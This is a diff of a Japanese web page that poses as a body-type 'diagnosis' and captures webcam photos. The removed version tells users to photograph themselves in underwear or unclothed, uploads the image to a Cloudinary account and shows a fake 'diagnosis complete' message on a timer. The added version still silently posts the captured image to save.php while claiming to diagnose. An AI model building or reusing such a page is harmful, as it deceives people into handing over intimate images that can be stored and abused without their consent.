@@ -1,117 +1,66 @@
 <!DOCTYPE html>
 <html lang="ja">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>骨格診断</title>
+  <meta charset="UTF-8">
+  <title>フォトテスト</title>
   <style>
     body {
-      font-family: system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
-      background: #f6f7f9;
-      margin: 0;
-      padding: 0;
+      font-family: sans-serif;
       text-align: center;
-      color: #333;
+      margin-top: 50px;
     }
-    header {
-      padding: 24px 16px 12px;
-      font-size: 28px;
-      font-weight: 700;
+    #status {
+      margin-top: 20px;
+      font-size: 20px;
+      color: gray;
     }
-    #camera {
-      margin: 16px auto;
-      width: 90%;
-      max-width: 360px;
-      border-radius: 16px;
-      overflow: hidden;
-      background: #000;
-    }
-    video, canvas {
-      width: 100%;
-      height: auto;
+    video {
+      width: 300px;
+      border-radius: 10px;
     }
     button {
-      margin: 20px auto;
-      padding: 14px 28px;
-      font-size: 16px;
-      border-radius: 999px;
-      border: none;
-      background: #111;
-      color: #fff;
-      cursor: pointer;
-    }
-    #loading {
-      display: none;
-      font-size: 16px;
       margin-top: 20px;
-    }
-    footer {
-      font-size: 12px;
-      color: #666;
-      padding: 20px;
-      line-height: 1.6;
+      padding: 10px 20px;
+      font-size: 18px;
     }
   </style>
 </head>
 <body>
 
-<header>骨格診断</header>
+<h2>フォトテスト</h2>
 
-<div id="camera">
-  <video id="video" autoplay playsinline></video>
-  <canvas id="canvas" style="display:none;"></canvas>
-</div>
+<video id="video" autoplay playsinline></video><br>
+<button id="shoot">写真を撮る</button>
 
-<button id="shoot">撮影する</button>
-
-<div id="loading">診断中です…</div>
-
-<footer>
-  ※ 上半身の骨格が判断できる状態（肌着、または何も着用していない状態）で撮影してください。<br>
-  ※ 逆光にならないよう、明るい場所で撮影してください。
-</footer>
+<div id="status"></div>
 
 <script>
 const video = document.getElementById("video");
-const canvas = document.getElementById("canvas");
-const shootBtn = document.getElementById("shoot");
-const loading = document.getElementById("loading");
+const button = document.getElementById("shoot");
+const status = document.getElementById("status");
 
-navigator.mediaDevices.getUserMedia({
-  video: { facingMode: "user" },
-  audio: false
-}).then(stream => {
-  video.srcObject = stream;
-});
+navigator.mediaDevices.getUserMedia({ video: true })
+  .then(stream => {
+    video.srcObject = stream;
+  });
 
-shootBtn.onclick = async () => {
-  loading.style.display = "block";
-  shootBtn.style.display = "none";
-
+button.onclick = () => {
+  const canvas = document.createElement("canvas");
   canvas.width = video.videoWidth;
   canvas.height = video.videoHeight;
-  canvas.getContext("2d").drawImage(video, 0, 0);
+  const ctx = canvas.getContext("2d");
+  ctx.drawImage(video, 0, 0);
 
-  const blob = await new Promise(res => canvas.toBlob(res, "image/jpeg"));
+  const imageData = canvas.toDataURL("image/jpeg");
 
-  const formData = new FormData();
-  formData.append("file", blob);
-  formData.append("upload_preset", "s1iuijuf");
-  formData.append("public_id", "latest");
-  formData.append("overwrite", "true");
+  fetch("save.php", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ image: imageData })
+  });
 
-const res = await fetch("https://api.cloudinary.com/v1_1/auto/upload", {
-  method: "POST",
-  body: formData
-});
-
-const data = await res.json();
-
-  loading.innerText = "診断中です…";
-  
-  setTimeout(() => {
-    loading.innerText = "診断が完了しました";
-  }, 2000);
+  status.textContent = "診断中…";
+  button.disabled = true;
 };
 </script>
 
